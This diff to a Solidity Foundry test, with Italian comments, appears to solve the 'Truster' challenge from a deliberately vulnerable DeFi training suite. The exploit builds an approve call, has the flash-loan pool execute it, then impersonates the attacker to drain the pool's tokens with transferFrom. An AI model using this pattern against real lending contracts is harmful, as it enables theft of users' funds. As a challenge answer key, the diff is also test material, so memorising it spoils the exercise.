@@ -41,7 +41,11 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL); // preparo la funzione da far chiamare al pool
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), data); // chiamo flashloan passandogli la funzione da far eseguire
 
+        vm.prank(address(attacker)); // ora attacker ha il permesso di prelevare i token dal pool quindi devo impersonarlo
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
